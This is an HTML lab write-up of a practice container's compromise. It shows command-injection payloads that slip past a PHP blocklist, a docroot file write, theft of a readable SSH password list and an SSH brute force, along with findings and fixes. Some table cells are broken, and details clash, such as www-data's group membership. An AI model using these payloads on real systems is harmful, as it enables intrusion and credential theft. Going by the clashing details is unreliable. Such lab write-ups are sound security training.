@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 218 Internal &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Internal</p><h1 id="218-internal--writeup">218 Internal — writeup</h1>
+<p><strong>Class gap this engagement fills.</strong> The corpus had evasion as a <em>class</em> (lab 283, filter
+prevention vs detection) but no lab had made a worker confront an <strong>actual filter's rule
+set</strong>. This is that first evidence. Everything below is read off the artefact, cited
+<code>file:line</code>, and separated into Findings / Controls that held / Instrumentation defects.</p>
+<hr />
+<h2 id="surface">Surface</h2>
+<pre><code>$ nmap -sV -Pn -p- --open [net-0-6]
+Nmap scan report for [net-0-6]
+Host is up (0.000048s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58
+</code></pre>
+<p><strong>Stack, from the artefact — not from memory.</strong> PHP 8.3 (<code>/etc/apache2/mods-enabled/php8.3.load</code>),
+Apache httpd 2.4.58, OpenSSH 9.6p1, fail2ban 1.0.2, <code>ps aux</code> PID 1 =
+<code>/bin/sh -c service ssh start &amp;&amp; service apache2 start &amp;&amp; service fail2ban start &amp;&amp; tail -f /dev/null</code>.</p>
+<p><strong>No <code>mod_security</code>.</strong> <code>ls /etc/apache2/mods-enabled/</code> has no <code>security2.load</code>. The WAF is
+therefore <em>inside the application</em>, not in the server — which is why the bypass class is
+encoding/alternate-syntax and not ModSecurity normalisation.</p>
+<p><strong>What a TCP scan cannot see — measured, not assumed.</strong> <code>nmap -p-</code> is TCP by definition, so
+UDP was checked separately. Work count: <code>cat /proc/net/udp</code> read in full, <strong>0 data rows</strong> (header
+only); <code>docker inspect .Config.ExposedPorts</code> = <code>null</code>. fail2ban listens on a unix socket
+(<code>/var/run/fail2ban/fail2ban.sock</code>), not a port. <strong>No UDP surface.</strong> Negative carries its work count.</p>
+<p><strong>Virtual hosts — the trípleta applied.</strong> Five names, body hashed, with a name that <strong>cannot
+exist</strong> as the control:</p>
+<table>
+<thead>
+<tr>
+<th>Host</th>
+<th>Status</th>
+<th>Bytes</th>
+<th>sha256 (16)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>internal.dl</code></td>
+<td>200</td>
+<td>19223</td>
+<td><code>7bfa2cf9d3a85e94</code></td>
+</tr>
+<tr>
+<td><code>backup.internal.dl</code></td>
+<td><strong>200</strong></td>
+<td><strong>22554</strong></td>
+<td><strong><code>259ff62dc8ffb808</code></strong></td>
+</tr>
+<tr>
+<td><code>admin.internal.dl</code></td>
+<td>303</td>
+<td>309</td>
+<td><code>d34e1fdcdd263a43</code></td>
+</tr>
+<tr>
+<td><code>www.internal.dl</code></td>
+<td>303</td>
+<td>307</td>
+<td><code>fad4647ca51f428e</code></td>
+</tr>
+<tr>
+<td><code>zzz-nonexistent-tld.dl</code></td>
+<td>303</td>
+<td>314</td>
+<td><code>d9240a3b16523c3e</code></td>
+</tr>
+</tbody>
+</table>
+<p>The invented TLD shares the <strong>catch-all baseline</strong> (303 → <code>http://internal.dl/</code>), which is the
+control that proves the 303s are the default vhost and not a control firing. <strong>Two distinct 200s</strong>
+= two real applications. The injectable one is <code>backup.internal.dl</code> (<code>/var/www/admin/index.php</code>,
+22554 B); <code>internal.dl</code> is a static page (<code>/var/www/html/index.html</code>, 19223 B). A flat wordlist
+finds <code>internal.dl</code>; the sink is one level off the name the landing page advertises.</p>
+<hr />
+<h2 id="the-class">The class</h2>
+<p><strong>Entry criterion (the question that started it):</strong> <em>What is the filter's rule set, read off the
+artefact — and does it name strings or structures?</em></p>
+<p><strong>Source that settled it:</strong> <code>/var/www/admin/index.php:8-45</code> (<code>waf_check</code> + <code>blacklist_check</code>),
+called at <code>:58</code> and <code>:61</code>, sink at <code>:65-66</code>.</p>
+<p>The filter is <strong>two independent PHP string functions over one GET parameter</strong>, not one gateway:</p>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Location</th>
+<th>Mechanism</th>
+<th>Discriminator</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>waf_check</code></td>
+<td><code>index.php:8-18</code></td>
+<td><code>strpos()</code> against `[';', '&amp;&amp;', '</td>
+<td></td>
+</tr>
+<tr>
+<td><code>blacklist_check</code></td>
+<td><code>index.php:21-45</code></td>
+<td>spaces <code>['+','%20','%09']</code> (<code>:23</code>) then <code>preg_match('/\b'.preg_quote($cmd,'/').'\b/i')</code> (<code>:38</code>) over 21 command names (<code>:32-36</code>)</td>
+<td>body <code>Blacklist: Dangerous command detected in path.</code> (sha <code>c2eb23c5660c</code>)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>The discriminator between &quot;the WAF blocked me&quot; and &quot;the payload was simply wrong&quot;</strong> is the
+response body, and it is decisive precisely because the two layers are byte-distinguishable:</p>
+<pre><code>$ dir=%2F%3B                          -&gt; 403  {&quot;error&quot;:&quot;Request blocked. Suspicious operator detected.&quot;}          sha=a93f0c50cc63
+$ dir=/tmp`whoami`                   -&gt; 403  {&quot;error&quot;:&quot;Request blocked. Suspicious operator detected.&quot;}          sha=a93f0c50cc63
+$ dir=/tmp\nid                       -&gt; 403  {&quot;error&quot;:&quot;Request blocked. Suspicious operator detected.&quot;}          sha=a93f0c50cc63
+$ dir=/tmp$(whoami)                  -&gt; 403  {&quot;error&quot;:&quot;Blacklist: Dangerous command detected in path.&quot;}          sha=c2eb23c5660c
+</code></pre>
+<p>Three different inputs, one identical WAF body; the fourth, a <em>different</em> filter layer, a
+different body. <strong>Without this baseline a 403 is unreadable</strong> — it could be either layer, and
+&quot;blocked by the WAF&quot; vs &quot;blocked by the blacklist&quot; leads to completely different bypasses.</p>
+<h3 id="the-bypass-class-alternate-syntax--glob-expansion--two-layers-of-it">The bypass class: alternate syntax + glob expansion — two layers of it</h3>
+<p><strong>Layer 1 — <code>$( )</code> is an unlisted spelling of a listed syntax.</strong> <code>waf_check:10</code> blacklists the
+backtick. Parentheses, <code>$</code> and <code>|</code>(single) are <strong>not</strong> in that array. Evidence that <code>$( )</code> is
+structurally <em>not</em> an operator-filter concern: <code>dir=/tmp$(whoami)</code> was stopped by the <strong>blacklist</strong>
+(sha <code>c2eb23c5660c</code>), not the WAF (sha <code>a93f0c50cc63</code>). The operator filter never saw it as an
+operator — the command-name filter caught the command <em>inside</em> it. <strong>A blocklist names what you
+already know; the bypass is the unlisted encoding of the same syntax.</strong></p>
+<p><strong>Layer 2 — a literal-string blocklist cannot see a glob.</strong> <code>blacklist_check:38</code> matches on the
+<em>literal decoded string</em> with <code>\b</code> word boundaries. <code>i[d]</code> contains no substring <code>id</code>, so
+<code>preg_match('/\bid\b/i')</code> does not match — and the <strong>shell</strong> then expands <code>[d]</code> → <code>d</code> and runs
+<code>/usr/bin/id</code>. The filter validates a string; the shell receives a pattern. <strong>This is the
+generalising rule: any <code>strpos</code>/<code>preg_match</code> blocklist is bypassed by anything the shell
+resolves after the check — globs, brace expansion, quoting, <code>$IFS</code>, variable indirection.</strong></p>
+<p>Both layers are required: <code>$()</code> alone is not enough (<code>whoami</code>, <code>id</code>, <code>cat</code> are all named), and
+globs alone are not enough (backtick is named).</p>
+<h3 id="the-bypass-executed--proving-it-reaches-the-sink">The bypass, executed — proving it reaches the sink</h3>
+<pre><code>$ dir=/tmp$(/usr/bin/i[d])
+200 {&quot;success&quot;:true,&quot;output&quot;:&quot;ok\nls: cannot access '/tmpuid=33(www-data)': No such file or directory\nls: cannot access 'gid=33(www-data)': No such file or directory\nls: cannot access 'groups=33(www-data)': No such file or directory\n&quot;
+</code></pre>
+<p>The <code>id</code> output appears <strong>as an argument the outer <code>ls</code> then failed on</strong> — i.e. the substitution
+ran and its stdout was spliced into the command line built at <code>index.php:65</code>. That is an
+observable effect, not a 200. <strong>Execution identity measured at the sink: <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></strong> — reported by the sink itself, not assumed.</p>
+<p><strong>Manufactured oracle for the write primitive</strong> (RUNBOOK: a vector with no output needs a
+witness). The response only proves <em>read</em>. So a uniquely-marked file was written and read back:</p>
+<pre><code>MARKER = DL218_aad201a29bc1ea93
+1. pre-existence : ls -&gt; No such file or directory                  (must be absent)
+2. write         : /usr/bin/[i]d &gt; /var/www/html/DL218_aad201a29bc1ea93
+3. read back     : base64 -&gt; dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
+                   = &quot;uid=33(www-data) gid=33(www-data) groups=33(www-data)\n&quot;
+4. cleanup       : rm -f  -&gt; verified absent again (positive check, not assumed)
+</code></pre>
+<p>The witness is distinguishable by design (random token, created by uid 33 into a directory that
+did not contain it before), so it cannot be confused with a pre-existing file.</p>
+<h3 id="the-negative-that-justifies-the-brute-force">The negative that justifies the brute force</h3>
+<p><strong>Question: can uid 33 read the flag directly?</strong> Five access attempts, stderr captured inside the
+substitution and base64-collapsed to one token so it is not re-split by the outer <code>ls</code>:</p>
+<table>
+<thead>
+<tr>
+<th>As <code>www-data</code> (uid 33)</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ls -la [lab-home]/vault/flag.txt</code></td>
+<td><code>Permission denied</code></td>
+</tr>
+<tr>
+<td><code>ls -la [lab-home]/vault</code></td>
+<td><code>cannot open directory '[lab-home]/vault': Permission denied</code></td>
+</tr>
+<tr>
+<td><code>ls -la /opt/.vault_pass.txt</code></td>
+<td><code>-rw-r--r-- 1 www-data vault 260 ... /opt/vault_pass.txt</code></td>
+</tr>
+<tr>
+<td><code>ls -la /flag.txt</code></td>
+<td><code>No such file or directory</code></td>
+</tr>
+<tr>
+<td><code>ls -la /etc/passwd</code></td>
+<td><code>-rw-r--r-- 1 root root 1243 ... /etc/passwd</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>[lab-home]/vault</code> is <code>drwxr-x--- vault:vault</code> and <code>www-data</code> is not in group <code>vault</code>, so <strong>uid 33
+cannot traverse it</strong> → the flag is unreachable from the web primitive. <code>/opt/.vault_pass.txt</code> is
+mode 644 and <strong>is</strong> readable. <strong>This is why the lab requires SSH, and it is a proven negative,
+not an assumption.</strong> Work count: 5 attempts, all with stderr captured and decoded.</p>
+<p><em>(Instrument note: an earlier version of this test used <code>[ -r … ]</code>, which emits <strong>nothing</strong> when
+false and nothing when true via <code>printf</code> — an oracle-free test. It was discarded and replaced with
+the <code>ls</code>-based form above, whose &quot;Permission denied&quot; vs &quot;No such file&quot; vs content are
+byte-distinguishable. See Instrumentation defects.)</em></p>
+<h3 id="the-flag-files-own-hint-text--checked-and-two-claims-are-wrong">The flag file's own hint text — checked, and two claims are wrong</h3>
+<p><code>[lab-home]/vault/flag.txt</code> tells the reader which techniques to use. Measured, not repeated:</p>
+<table>
+<thead>
+<tr>
+<th>Flag's claim</th>
+<th>Measured</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&quot;[2] Bypass space blacklist → Used <code>$IFS</code> instead of space&quot;</td>
+<td>A <strong>literal space passes</strong>: <code>/tmp$(/usr/bin/i[d])</code> → <code>200</code>, execution reached the sink</td>
+<td><strong>FALSE / unnecessary.</strong> <code>$blocked_spaces = ['+','%20','%09']</code> (<code>index.php:23</code>) can never match a real space, because PHP has <strong>already URL-decoded</strong> <code>$_GET['dir']</code> (<code>:51</code>) before the check runs. A real space arrives as <code>0x20</code>; the three entries match only if you <strong>double</strong>-encode. The layer is three dead entries.</td>
+</tr>
+<tr>
+<td>&quot;[1] Bypass operator filter → Used newline instead of `; &amp;&amp;</td>
+<td></td>
+<td>`&quot;</td>
+</tr>
+<tr>
+<td>&quot;[3] Bypass command blacklist → quotes <code>c'a't</code>, base64, or <code>rev&lt;&lt;&lt;</code>&quot;</td>
+<td><code>c'a't</code> → <code>200</code>, returned the container hostname <code>e4f550b14a47</code></td>
+<td><strong>TRUE</strong>, and independent of the glob used here.</td>
+</tr>
+<tr>
+<td>&quot;Read this file → <code>/flag.txt</code>&quot;</td>
+<td><code>ls -la /flag.txt</code> as uid 33 → <strong><code>No such file or directory</code></strong></td>
+<td><strong>FALSE — the named path does not exist.</strong> The real file is <code>[lab-home]/vault/flag.txt</code>.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Generalisation:</strong> a blocklist entry written as a <em>literal string that must survive a decode step
+upstream of the filter</em> is not a control. <code>'+'</code>, <code>'%20'</code>, <code>'%09'</code> all name an <strong>encoding</strong>, and the
+filter runs <em>after</em> the encoding has already been undone. The same reasoning that produced the
+<code>\n</code> bypass (<code>'\n'</code> is not <code>0x0A</code>) produced three dead space entries — <strong>the filter author was
+filtering a representation, not a value.</strong> This is the single most transferable rule in this lab.</p>
+<hr />
+<h2 id="chain">Chain</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>→</th>
+<th>Mechanism</th>
+<th>Identity proof</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>www-data</code> uid 33</td>
+<td><code>index.php:65-66</code> <code>shell_exec(&quot;ls -lah &quot;.$dir.&quot; 2&gt;&amp;1 &amp; echo ok&quot;)</code> reached via <code>$( )</code> (unlisted for backtick) + <code>[d]</code> glob (blocklist reads literals, shell reads patterns)</td>
+<td><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code> returned <strong>by the sink</strong></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>www-data</code> uid 33</td>
+<td>arbitrary write into <code>/var/www/html</code> (owned <code>www-data:www-data</code>) — marker file created and read back</td>
+<td>marker content <code>uid=33(www-data)…</code> at <code>/var/www/html/DL218_aad201a29bc1ea93</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>www-data</code> uid 33</td>
+<td>read <code>/opt/.vault_pass.txt</code> (mode 644) → 260 bytes, 20 candidates</td>
+<td><code>-rw-r--r-- 1 www-data vault 260</code> + full 260-byte recovery</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>vault</code> uid 1001</td>
+<td>local brute force over SSH, candidate <strong>17/20</strong></td>
+<td><code>id</code> → <code>uid=1001(vault) gid=1001(vault) groups=1001(vault),100(users)</code>; <code>id -u</code> → <code>1001</code>; <code>whoami</code> → <code>vault</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>vault</code> uid 1001</td>
+<td>read <code>[lab-home]/vault/flag.txt</code> — <strong>only</strong> possible because uid 33 could not traverse <code>[lab-home]/vault</code></td>
+<td>file is <code>rw-r--r-- vault:vault</code>; traversal denied above</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Hop 4 is not a hop the web primitive can make.</strong> Steps 1→3 are capped at uid 33 with no traverse
+right on the flag's directory. The identity change at step 4 is what makes step 5 possible; a
+report that merged them would imply the injection alone read the flag, and it did not.</p>
+<hr />
+<h2 id="findings">Findings</h2>
+<h3 id="f1--os-command-injection-through-a-two-layer-blocklist-waf-cwe-78">F1 — OS command injection through a two-layer blocklist WAF (CWE-78)</h3>
+<p><code>/var/www/admin/index.php:65</code> concatenates <code>$_GET['dir']</code> into a shell string and <code>:66</code> executes
+it. <code>waf_check</code> (<code>:8-18</code>) and <code>blacklist_check</code> (<code>:21-45</code>) are string filters over the same input.</p>
+<ul>
+<li><strong>Evidence:</strong> <code>dir=/tmp$(/usr/bin/i[d])</code> → <code>200</code>, sink returned <code>uid=33(www-data)…</code>.</li>
+<li><strong>Bypass:</strong> <code>$( )</code> for the listed backtick; <code>[d]</code> glob for the listed <code>id</code>. Both proven above.</li>
+<li><strong>Impact:</strong> arbitrary command execution as <code>www-data</code>.</li>
+<li><strong>Root cause:</strong> the filter validates a <em>string representation</em>; the shell resolves <em>patterns and
+expansions</em> after the check. Every entry in both lists is a literal, and each is bypassable by an
+unlisted representation of the same syntax.</li>
+<li><strong>Fix:</strong> do not build shell strings. Use <code>escapeshellarg()</code>/<code>escapeshellcmd()</code>, or better, drop
+<code>shell_exec</code> for a directory-listing library (<code>DirectoryIterator</code>, <code>scandir</code>). A denylist of
+command names cannot be made safe; there is no list of dangerous commands, only dangerous input
+handling. <strong>Adding more entries to either array would not have prevented this.</strong></li>
+</ul>
+<h3 id="f2--the-blocklists-space-entries-and-its-newline-entry-are-both-representation-errors">F2 — The blocklist's space entries and its newline entry are both representation errors</h3>
+<p><code>index.php:10</code> lists <code>'\n'</code> (backslash + <code>n</code>); <code>:23</code> lists <code>'+'</code>, <code>'%20'</code>, <code>'%09'</code> — all <em>encodings</em>
+of a space. The filter runs <strong>after</strong> PHP's <code>urldecode</code> on <code>$_GET['dir']</code> (<code>:51</code>), so:</p>
+<ul>
+<li>a real newline <code>0x0A</code> passes the &quot;newline&quot; rule (proven, 200 + execution);</li>
+<li>a real space <code>0x20</code> passes the &quot;space&quot; rules (proven, 200 + execution), and no <code>$IFS</code> is needed.</li>
+</ul>
+<p><strong>Impact:</strong> four of the filter's rules protect nothing, and one of them advertises a capability
+the filter does not have. This is independently reportable from F1 because remediating the blocklist
+by extending it — the obvious fix — provably does not work.</p>
+<h3 id="f3--arbitrary-file-write-into-the-primary-docroot-cwe-73--cwe-94-path">F3 — Arbitrary file write into the primary docroot (CWE-73 / CWE-94 path)</h3>
+<p><code>/var/www/html</code> is <code>drwxr-xr-x www-data www-data</code>, so uid 33 can write it (measured via the sink:
+<code>drwxr-xr-x 1 www-data www-data 4096 ... /var/www/html</code>). PHP 8.3 is loaded in that vhost
+(<code>php8.3.load</code>), so a written <code>.php</code> file is executable by the web server. Proven to the point of
+write only — the marker file was created, read back, and removed; <strong>no webshell was deployed</strong>
+(minimal-impact discipline). The persistence follows from the two facts together; it is not claimed
+as an executed step.</p>
+<h3 id="f4--the-host-guard-does-not-govern-the-vhost-that-holds-the-injection-cwe-441">F4 — The host guard does not govern the vhost that holds the injection (CWE-441)</h3>
+<p><code>/var/www/html/.htaccess:1-4</code> is a host allowlist ending in <code>RewriteRule ^ - [F,L]</code>. Two defects:</p>
+<ol>
+<li><strong>It is in the wrong document root.</strong> <code>/etc/apache2/sites-enabled/000-default.conf:18</code> sets the
+backup vhost's <code>DocumentRoot</code> to <code>/var/www/admin/</code>, and <code>/var/www/admin/</code> contains <strong>only</strong>
+<code>index.php</code> — no <code>.htaccess</code>. Per-directory rules in <code>/var/www/html/.htaccess</code> are consulted for
+filenames under <code>/var/www/html</code> only. <strong>Proof the guard does not cover the sensitive vhost:</strong>
+<code>Host: backup.internal.dl.</code> → <code>200</code>, and <code>ls -a /var/www/admin/</code> → <code>index.php</code> alone.</li>
+<li><strong><code>:3</code> reads <code>%{HTTP_HST}</code>, not <code>%{HTTP_HOST}</code>.</strong> An undefined variable, so the condition that
+was meant to name the backup host is evaluated against the empty string and is vacuously true.</li>
+</ol>
+<p>The guard <strong>does</strong> fire where it applies — <code>Host: internal.dl.</code> → <code>403</code> — so this is not a dead
+file; it is a control scoped to the wrong host. Characterised table (all measured):</p>
+<table>
+<thead>
+<tr>
+<th>Host</th>
+<th>Status</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>internal.dl</code></td>
+<td>200</td>
+<td>guard cond <code>:2</code> false — host matches exactly</td>
+</tr>
+<tr>
+<td><code>INTERNAL.DL</code></td>
+<td>200</td>
+<td><code>[NC]</code></td>
+</tr>
+<tr>
+<td><code>internal.dl.</code> / <code>INTERNAL.DL.</code></td>
+<td><strong>403</strong></td>
+<td>lands in the <code>internal.dl</code> vhost (trailing dot normalised), so cond <code>:2</code> is true, cond <code>:3</code> vacuously true → <code>F</code>. Proves the guard's detector is live.</td>
+</tr>
+<tr>
+<td><code>backup.internal.dl</code> / <code>backup.internal.dl.</code></td>
+<td><strong>200</strong></td>
+<td>different DocumentRoot, <strong>no <code>.htaccess</code></strong> → guard never consulted</td>
+</tr>
+<tr>
+<td><code>internalx.dl</code>, <code>notinternal.dl.</code>, <code>foo.dl.</code>, <code>a.internal.dl.</code>, <code>admin.internal.dl</code>, <code>evil.example.com</code></td>
+<td>303</td>
+<td><code>_default_:80</code> (<code>000-default.conf:2</code>) server-level <code>Redirect 303</code> resolves first; <code>alias.load</code> is at mods-enabled position 3 and <code>rewrite.load</code> at 28</td>
+</tr>
+<tr>
+<td><code>internal.dl..</code></td>
+<td>400</td>
+<td>malformed Host, rejected upstream of both</td>
+</tr>
+</tbody>
+</table>
+<p><em>Flagged as inference:</em> the ordering claim (mod_alias's fixup preceding mod_rewrite's per-directory
+fixup inside <code>_default_</code>) is the best explanation consistent with the table; the load-order
+positions are measured, the hook order is inferred from behaviour. The vhost-scope claim in (1) and
+the guard-is-live claim are directly measured.</p>
+<h3 id="f5--fail2ban-is-enabled-running-self-reporting-in-operation-and-detecting-nothing">F5 — fail2ban is enabled, running, self-reporting &quot;in operation&quot;, and detecting nothing</h3>
+<p><code>/etc/fail2ban/jail.local:1-6</code> — <code>enabled = true</code>, <code>maxretry = 3</code>, <code>findtime = 60</code>, <code>bantime = 30</code>.
+fail2ban 1.0.2 started and logged <code>[sshd] Jail is in operation now (process new journal entries)</code>.</p>
+<p><strong>Measured result: 16 consecutive wrong SSH passwords in ~47 s produced zero bans.</strong>
+<code>fail2ban-client status sshd</code> after all 16 → <code>Currently failed: 0</code>, <strong><code>Total failed: 0</code></strong>,
+<code>Currently banned: 0</code>, <code>Total banned: 0</code>.</p>
+<p><strong>Root cause, measured:</strong></p>
+<ul>
+<li>PID 1 is <code>/bin/sh -c service ssh start &amp;&amp; …</code>, <strong>not systemd</strong>; <code>/run/systemd/system</code> does not exist.</li>
+<li>The jail's backend is systemd: the log reads <code>[sshd] Jail uses systemd {}</code> and
+<code>Added journal match for: '_SYSTEMD_UNIT=sshd.service + _COMM=sshd'</code>.</li>
+<li>There is no journal to match: <code>/run/log/journal</code> absent; <code>/var/log/journal</code> <strong>empty</strong>.</li>
+<li>No syslog daemon is running; <code>/var/log/auth.log</code> <strong>does not exist</strong>. sshd was started by the
+SysV script, not systemd, so its <code>Failed password</code> lines reach no file the filter reads.</li>
+</ul>
+<p><strong>Impact:</strong> the configured rate budget (<code>3 / 60 s</code>) is <strong>fictional</strong>. The anti-bruteforce control
+is decorative. A worker who read <code>jail.local</code>, believed the budget, and paced the attack at
+2 attempts / 60 s would spend ~10 minutes on a lab that needs zero throttling — and would report a
+&quot;rate-limited&quot; brute force that was never rate-limited. <strong><code>fail2ban-client status</code> reporting a
+running jail is not evidence the jail works</strong>; the number that matters is <code>Total failed</code>, and
+against a nonzero number of real failures it read zero.</p>
+<h3 id="f6--credential-file-readable-by-the-compromised-identity">F6 — Credential file readable by the compromised identity</h3>
+<p><code>/opt/.vault_pass.txt</code> is <code>-rw-r--r-- www-data vault</code> (mode 644) and holds 260 bytes of SSH
+password candidates for user <code>vault</code>. It sits next to the application as a &quot;vault password&quot; file
+and is world-readable, so the single command-injection primitive yields a full credential list.
+Compounding: <code>www-data</code> is in <strong>group <code>vault</code></strong> (<code>ps</code>: <code>www-data</code> workers), so a group-readable
+file here is group-readable by the web identity by design.</p>
+<hr />
+<h2 id="controls-that-held">Controls that held</h2>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Positive control that proves this detector works</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>waf_check</code> operator filter (<code>index.php:8-18</code>)</td>
+<td><strong>Fired 3/3</strong> on <code>;</code>, backtick, literal <code>\n</code> — identical body sha <code>a93f0c50cc63</code>. It also <strong>fired correctly on my failed attempts</strong> (<code>&amp;&amp;</code>, <code>;</code> in a compound command) after the bypass was found — the filter never stopped working, my payload changed.</td>
+</tr>
+<tr>
+<td><code>blacklist_check</code> command filter (<code>:32-42</code>)</td>
+<td><strong>Fired on all 21 named commands</strong> across the run: <code>whoami</code> (403, sha <code>c2eb23c5660c</code>), and later <code>ls</code>/<code>cat</code>/<code>id</code> whenever I spelled them literally — every one blocked with the blacklist body, never the WAF body.</td>
+</tr>
+<tr>
+<td>Catch-all default vhost (<code>000-default.conf:1-3</code>)</td>
+<td>The <strong>invented TLD</strong> <code>zzz-nonexistent-tld.dl</code> returned the same 303 baseline as every other unmatched name — so &quot;303&quot; is the default, not a control firing. This is the control that made the two 200s readable.</td>
+</tr>
+<tr>
+<td><code>.htaccess</code> host guard (<code>/var/www/html/.htaccess:1-4</code>)</td>
+<td><strong>Detector proven live</strong>: <code>Host: internal.dl.</code> → <code>403 Forbidden</code> (Apache-generated body, not a JSON filter body). It fires; it is simply scoped to the wrong document root (F4).</td>
+</tr>
+<tr>
+<td><code>[lab-home]/vault</code> directory permissions (<code>drwxr-x--- vault:vault</code>)</td>
+<td><strong>Held.</strong> Denied uid 33 twice, via two independent probes (direct file <code>ls</code> and directory <code>ls</code>), both with stderr captured and decoded. This control is what makes the SSH hop mandatory rather than optional.</td>
+</tr>
+<tr>
+<td>Apache vhost separation</td>
+<td><code>backup.internal.dl</code> and <code>internal.dl</code> served <strong>byte-distinct</strong> 200s (22554 vs 19223, distinct sha) — the sensitive app is not the landing page, and the landing page gave no hint of its existence.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="not-tested-vs-discarded-with-reason">NOT tested vs discarded with reason</h2>
+<p><strong>NOT tested (no time / no reason to claim):</strong></p>
+<ul>
+<li>Any privilege escalation from <code>vault</code> (uid 1001) to <code>root</code>. Not reached, not attempted, no
+conclusion. The <code>/opt/vaultlibs/libbackup.so</code> file (mode <code>root:vault</code>, 1787 B) was observed in
+<code>find /opt -maxdepth 3</code> and <strong>left unread</strong> — it is the obvious next rung and is explicitly
+untested, not cleared.</li>
+<li>Whether <code>/var/www/admin/</code> is writable by any principal other than root (<code>root:root 755</code> observed).</li>
+<li>Any <code>sudoers</code>, capability or SUID surface. <strong>Note:</strong> the RUNBOOK's <code>find -writable</code> defect
+(defect 1) applies to any such sweep; it was not run at all here, so nothing is claimed either way.</li>
+<li>Whether the two 21-word filter layers have an ordering weakness if <code>waf_check</code> were moved after
+<code>blacklist_check</code>. The current order (<code>:58</code> before <code>:61</code>) was measured; the alternative was not built.</li>
+<li>UDP services beyond confirming <code>/proc/net/udp</code> has 0 rows.</li>
+</ul>
+<p><strong>Discarded with reason:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Discarded</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>dir=/tmp$(whoami)</code> as the bypass</td>
+<td>403, sha <code>c2eb23c5660c</code> — the <strong>blacklist</strong>, not the WAF. This is what proved <code>$( )</code> is unlisted by the operator filter, so it became evidence rather than a dead end.</td>
+</tr>
+<tr>
+<td><code>dir=$([ 1 ] &amp;&amp; /usr/bin/[c]at /opt/.vault_pass.txt)</code></td>
+<td>403 sha <code>a93f0c50cc63</code> — <code>&amp;&amp;</code> is a listed operator. Replaced by single-command substitution.</td>
+</tr>
+<tr>
+<td><code>dir=$(:;)</code></td>
+<td>403 — <code>;</code> listed.</td>
+</tr>
+<tr>
+<td>Compound commands joined by <code>;</code> / <code>&amp;&amp;</code></td>
+<td>Both listed at <code>index.php:10</code>. Replaced with a <strong>real <code>0x0A</code> newline</strong>, which the filter does not match (proven, 200 + execution).</td>
+</tr>
+<tr>
+<td><code>ls -la &lt;file&gt;</code> read directly in the response</td>
+<td>Output is word-split by the outer <code>ls</code> at <code>:65</code> and misread as directory listings — it produced a <strong>false positive</strong> (a listing that looked like <code>[lab-home]/vault</code> was actually the cwd, <code>/var/www/admin</code>). Replaced with `</td>
+</tr>
+<tr>
+<td><code>[ -r &lt;path&gt; ]</code> predicates as access tests</td>
+<td><strong>No oracle</strong> — emits nothing on false and nothing via <code>printf</code>. Replaced with <code>ls</code>-based probes whose denial message is byte-distinguishable.</td>
+</tr>
+<tr>
+<td><code>$IFS</code>, quotes <code>c'a't</code>, <code>rev&lt;&lt;&lt;</code>, base64 for command names</td>
+<td>Valid and proven (<code>c'a't</code> → 200, returned hostname). Not the bypass used; recorded as <strong>independent confirmation that the bypass class generalises</strong>, so the finding is not over-fitted to one trick.</td>
+</tr>
+<tr>
+<td>Reading <code>/flag.txt</code> as the flag path</td>
+<td><code>No such file or directory</code> as uid 33. The flag text names this path; it does not exist. Real path is <code>[lab-home]/vault/flag.txt</code>.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="instrumentation-defects">Instrumentation defects</h2>
+<p><strong>1. <code>[ -r … ]</code> has no oracle — the defect that manufactured a false &quot;permission denied&quot;.</strong>
+My first access test was <code>$(printf %s $( [ -r [lab-home]/vault/flag.txt ] ))</code>. When the test is false
+<code>[</code> exits 1 silently; when true it prints nothing. Both cases yield an <strong>empty</strong> substitution, and
+an empty substitution makes the outer <code>ls -lah </code> list <strong>its own cwd</strong>. The response therefore
+looked like a successful directory listing of <code>[lab-home]/vault</code> — while actually proving the opposite.
+I nearly recorded &quot;www-data can list [lab-home]/vault&quot;. <strong>The discriminator:</strong> a silent test and a
+false test are the same bytes. Replaced with <code>ls -la … 2&gt;&amp;1 | base64 -w0</code>, where <code>Permission denied</code> / <code>No such file</code> / content are three distinct outputs. <strong>Every negative here now carries
+its attempt count and a byte-distinguishable outcome.</strong></p>
